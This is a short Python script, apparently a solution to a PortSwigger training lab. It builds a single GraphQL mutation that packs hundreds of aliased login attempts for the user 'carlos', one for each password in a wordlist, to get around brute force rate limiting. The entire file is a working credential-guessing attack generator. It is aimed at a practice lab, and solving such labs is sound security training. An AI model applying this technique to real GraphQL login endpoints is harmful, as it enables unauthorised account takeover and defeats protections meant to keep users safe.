# Created by WafflesExploits
# Solution to PortSwigger's Lab: Bypassing GraphQL brute force protections
Wordlist = 'pass.txt'
Output = 'output.txt'

def getString_Template(i, username, password):
  input = '{password: "%s", username: "%s"}' % (password, username)
  string_template = """
          bruteforce%s:login(input:%s) {
                token
                success
          }
  """ % (i, input)
  return string_template
 

file = open(Output, "w+")

file.write("mutation login{")

i = 0
with open(f'{Wordlist}') as f: # Opens and automatically closes the passwordfile.
    lines = f.readlines()
    for password in lines:
      string_modified = getString_Template(str(i), 'carlos', password.strip())
      file.write(string_modified)
      i += 1

file.write("}")

file.close()
